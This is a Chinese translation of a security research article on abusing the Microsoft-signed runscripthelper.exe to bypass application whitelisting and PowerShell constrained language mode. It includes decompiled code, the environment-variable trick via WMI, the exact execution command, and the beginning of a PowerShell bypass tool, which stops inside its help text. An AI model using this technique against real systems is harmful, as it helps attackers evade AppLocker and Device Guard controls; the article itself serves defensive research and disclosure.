# 【技术分享】如何利用runscripthelper.exe绕过应用程序白名单机制
|
##### 译文声明
本文是翻译文章，文章来源：specterops.io
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
译者：[兴趣使然的小胃](http://bobao.360.cn/member/contribute?uid=2819002922)
预估稿费：200RMB
投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
**一、简介**
在实践[PowerShell课程](https://specterops.io/how-we-help/training-offerings/adversary-tactics-powershell)中的某个实验时，我偶然发现了System32目录下存在一个PowerShell宿主进程，该程序为runscripthelper.exe，经过微软的签名。Windows
10
RS3系统中刚刚引入这个程序，其功能是从特定目录读取PowerShell代码并加以执行。这种执行PowerShell代码的方式有一些副作用，我们可以借此绕过[受限语言模式](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_language_modes?view=powershell-5.1)的限制。
反编译runscripthelper.exe后，其入口点如下所示：
    private static int Main(string[] args)
    {
     try
     {
      if (args.Length != 3)
      {
       throw new Exception("Invalid command line");
      }
      string text = args[0];
      string text2 = args[1];
      string text3 = args[2];
      if (string.IsNullOrEmpty(text2) || string.IsNullOrEmpty(text2) || string.IsNullOrEmpty(text3))
      {
       throw new Exception("Invalid args");
      }
      if (!Program.k_scriptSet.Contains(text))
      {
       throw new Exception("Unknown script");
      }
      string text4 = Environment.ExpandEnvironmentVariables(Program.k_utcScriptPath);
      if (text2.Length <= text4.Length || !text4.Equals(text2.Substring(0, text4.Length), StringComparison.OrdinalIgnoreCase))
      {
       throw new Exception("Unknown script path: " + text2);
      }
      text2 = Program.GetShortPath(text2);
      text3 = Program.GetShortPath(text3);
      if (text.CompareTo("surfacecheck") == 0)
      {
       SurfaceCheckProcessor.ProcessSurfaceCheckScript(text2, text3);
      }
     }
     catch (Exception ex)
     {
      Console.WriteLine("Exception occurred: " + ex.Message);
      Console.WriteLine("Inner Exception: " + ex.InnerException);
      return -1;
     }
     return 0;
    }
如你所见， 该程序接受三个命令行参数：  
1、参数#1必须与"surfacecheck"字符串匹配，才能执行ProcessSurfaceCheckScript方法，这个方法会接收传入的第2及第3个参数。
2、参数#2包含待执行脚本的完整路径，并且会跟“k_utcScriptPath”全局变量进行比较（“k_utcScriptPath”这个环境变量展开后为“\?%ProgramData%MicrosoftDiagnosisscripts”）。
3、参数#3为一个已有目录的具体路径，命令输出结果会保存到该目录。
根据上述代码，待执行的脚本似乎必须位于%ProgramData%MicrosoftDiagnosisscripts目录中。默认情况下（至少在我当前系统下），普通用户不具备对该目录的写入权限。而理想情况下，我更希望能以非特权用户身份来绕过受限环境。因此，如果我能在runscripthelper.exe启动时以某种方式控制%ProgramData%的内容，我应该可以让该程序从可控的目录中执行脚本。待会我们再回到这个主题，现在我们可以先分析一下ProcessSurfaceCheckScript方法，看看它执行的是哪些内容：
    public static void ProcessSurfaceCheckScript(string scriptPath, string outputPath)
    {
     if (!File.Exists(scriptPath))
     {
      throw new Exception("Script does not exist");
     }
     if (!Directory.Exists(outputPath))
     {
      throw new Exception("Output path does not exist");
     }
     PowerShell powerShell = PowerShell.Create();
     powerShell.AddScript("Set-ExecutionPolicy -Scope Process unrestricted");
     powerShell.AddScript("$InvokedFromUIF = $true");
     powerShell.AddScript("$FailureText = "UIF"");
     powerShell.AddScript("$ScriptPath = "" + Path.GetDirectoryName(scriptPath) + """);
     powerShell.AddScript("$LogDir = "" + outputPath + """);
     SurfaceCheckProcessor.ReadCmdlets(powerShell, scriptPath);
     string script = File.ReadAllText(scriptPath);
     powerShell.AddScript(script);
     powerShell.Invoke();
     if (powerShell.HadErrors)
     {
      foreach (ErrorRecord current in powerShell.Streams.Error)
      {
       Console.WriteLine("Error: " + current);
       Console.WriteLine("Exception: " + current.Exception);
       Console.WriteLine("Inner Exception: " + current.Exception.InnerException);
      }
     }
    }
因此，从代码表面上来看，ProcessSurfaceCheckScript方法的功能是读取脚本的内容并加以执行（顺便提一下，该方法并不在意脚本的文件扩展名）。在运行AppLocker或者Device
Guard的系统上（现在Device Guard已改名为Windows Defender Application
control），由于程序的发布者为微软，因此该程序很有可能会被添加到白名单中，该进程中执行的任何PowerShell代码都会以全语言模式（full
language mode）执行，因此攻击者可以绕过受限语言模式的限制。  
**  
**
**二、利用方法**
作为一名攻击者，我们需要控制%ProgramData%的内容，将其指向我们能控制的某个目录。想完成这个任务可以有多种方法，我所知道的一种方法就是在调用[Win32进程创建函数](https://msdn.microsoft.com/en-us/library/aa389388\(v=vs.85\).aspx)时，设置[Win32_ProcessStartup](https://msdn.microsoft.com/en-us/library/aa394375\(v=vs.85\).aspx)类实例中的EnvironmentVariables属性。此外，WMI还提供了远程调用功能，这个功能有许多好处，并且有几个WMI宿主应用不大可能会被应用白名单机制所阻拦。与此同时，如果你没有传入程序预期的许多环境变量，许多子进程就无法正常加载。
成功控制传递给runscripthelper.exe的环境变量后，我们可以使用如下命令来执行我们的载荷：
    runscripthelper.exe surfacecheck \?C:TestMicrosoftDiagnosisscriptstest.txt C:Test
能够绕过限制机制的完整PowerShell代码如下所示：
    function Invoke-RunScriptHelperExpression {
    <#
    .SYNOPSIS
    Executes PowerShell code in full language mode in the context of runscripthelper.exe.
    .DESCRIPTION
    Invoke-RunScriptHelperExpression executes PowerShell code in the context of runscripthelper.exe - a Windows-signed PowerShell host application which appears to be used for telemetry collection purposes. The PowerShell code supplied will run in FullLanguage mode and bypass constrained language mode.
    Author: Matthew Graeber (@mattifestation)
    License: BSD 3-Clause
    .PARAMETER ScriptBlock
    Specifies the PowerShell code to execute in the context of runscripthelper.exe
    .PARAMETER RootDirectory
    Specifies the root directory where the "MicrosoftDiagnosisscripts" directory structure will be created. -RootDirectory defaults to the current directory.
    .PARAMETER ScriptFileName
    Specifies the name of the PowerShell script to be executed. The script file can be any file extension. -ScriptFileName defaults to test.txt.
    .PARAMETER HideWindow
    Because Invoke-RunScriptHelperExpression launches a child process in a new window (due to how Win32_Process.Create works), -HideWindow launches a hidden window.
    .EXAMPLE
    $Payload = {
        # Since this is running inside a console app,
        # you need the Console class to write to the screen.
        [Console]::WriteLine('Hello, world!')
        $LanguageMode = $ExecutionContext.SessionState.LanguageMode
        [Console]::WriteLine("My current language mode: $LanguageMode")
        # Trick to keep the console window up
        $null = [Console]::ReadKey()
    }
    Invoke-RunScriptHelperExpression -ScriptBlock $Payload
    .OUTPUTS
    System.Diagnostics.Process
    Outputs a process object for runscripthelper.exe. This is useful if it later needs to be killed manually with Stop-Process.